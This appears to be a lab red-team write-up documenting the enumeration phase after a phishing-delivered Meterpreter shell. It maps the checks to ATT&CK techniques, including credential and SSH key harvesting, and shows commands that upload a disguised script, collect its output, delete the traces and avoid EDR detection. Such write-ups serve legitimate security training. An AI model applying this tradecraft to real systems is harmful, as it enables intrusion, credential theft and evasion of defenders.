
# 04 — Enumeration

> **Engagement:** Authorized lab engagement — phishing campaign (weaponized payload → reverse Meterpreter session) followed by structured post-exploitation enumeration.
> **Phase position:** 04 of N — receives Initial Access (03), feeds Privilege Escalation / Lateral Movement (05+).
> **ATT&CK Enterprise mapping:** Discovery (TA0007)

---

## 1. Objective

With a foothold established via reverse shell (T1059 / T1059.001 delivery through phishing, T1566), this phase extracts the intelligence required to plan privilege escalation and lateral movement, without degrading OPSEC:

- Host identity, OS, patch level and exposure (T1082)
- Current user context, privileges, and sudo/group memberships (T1087, T1069)
- Stored credentials and key material (T1555)
- Internal topology: interfaces, routes, ARP neighbors, listening services (T1016, T1046, T1049)
- Privilege escalation candidates (SUID binaries, writable configs, kernel exposure)

Everything collected here is consumed downstream: findings are triaged into the phase report and mapped to the next-stage playbook.

## 2. Methodology

Enumeration is **automated, scripted, and ATT&CK-mapped** — no ad-hoc command salad. Each `run()` block in the scripts corresponds to one documented technique:

| Check | ATT&CK Technique | Purpose |
|---|---|---|
| `system_info` | T1082 | OS, kernel, uptime → privesc candidate matching |
| `kernel_exploits` | T1082 | Package/kernel versions exposed to known CVEs |
| `current_user` | T1087 / T1069 | Identity, sudo rules without password prompt |
| `local_users` | T1087 | Interactive accounts, home directories |
| `creds_search` | T1555 | Password/API-key patterns in user-writable paths |
| `ssh_keys` | T1552.004 | Private key material for lateral movement |
| `network` | T1016 / T1018 | Interfaces, routes, neighbors, internal hosts |
| `services_local` | T1046 | Listening services → pivot / tunnel targets |
| `suid_binaries` | T1548.001 (candidate) | GTFOBins-matched escalation vectors |

**Execution flow:** Meterpreter upload → execute with minimal footprint → collect structured output → exfiltrate results → self-cleanup → triage into `report/`.

## 3. Usage

### Linux (`scripts/enum_linux.sh`)

```bash
./scripts/enum_linux.sh --output ./enum_$(date -u +%Y%m%dT%H%M%SZ) [--quiet]
```

### Flags:

*  --output DIR — evidence directory (default: ./enum_<UTC timestamp>)
*  --quiet — suppress stderr progress output (OPSEC: no terminal noise)

### Delivery over Meterpreter (as executed in this engagement)

```
meterpreter > upload enum_linux.sh /tmp/.sys-cache
meterpreter > shell
$ chmod +x /tmp/.sys-cache && /tmp/.sys-cache --quiet --output /tmp/.sys-tmp
$ exit
meterpreter > download /tmp/.sys-tmp ./evidence/raw/
meterpreter > shell
$ rm -rf /tmp/.sys-cache /tmp/.sys-tmp && exit   # self-cleanup

```
Requirements: bash 4+, find, grep, ip/ss (with netstat fallback). No external tooling uploaded — everything runs with on-host natives to minimize footprint.

#### 4. OPSEC Notes

*  No payload  beyond one script, deployed to /tmp under a neutral name (.sys-cache), deleted after collection.

*  Native tooling only — no C2 chirps, no downloads; reduces EDR/AV signature surface and network anomalies.

*  Credential material is hashed/flagged, never exfiltrated in bulk — filenames and paths are recorded; content validation happens only against specific high-value candidates.

*  Credential material is hashed/flagged, never exfiltrated in bulk — filenames and paths are recorded; content validation happens only against specific high-value candidates.

#### 5. Output Structure


```
evidence/
├── raw/                  # untouched script output, one file per check, timestamped
│   ├── system_info.txt
│   ├── current_user.txt
│   └── ...
└── findings.json         # machine-readable triage: finding_id, technique, severity, next_phase

```
findings.json is the single source of truth: it is generated by the script, consumed by the report, and never hand-edited. evidence/raw/ is never modified post-collection (chain of custody).

### 7. Reproducibility & Ethics

*  All scripts are idempotent and re-runnable against a clean lab target (Metasploitable / custom VM).
*  Evidence in this repository has been sanitized: real IPs, hostnames, and credentials replaced with placeholders. Sanitization is lossless to the methodology but prevents live-credential exposure.
*  Scripts and results are provided for educational/portfolio demonstration within authorized lab environments only.
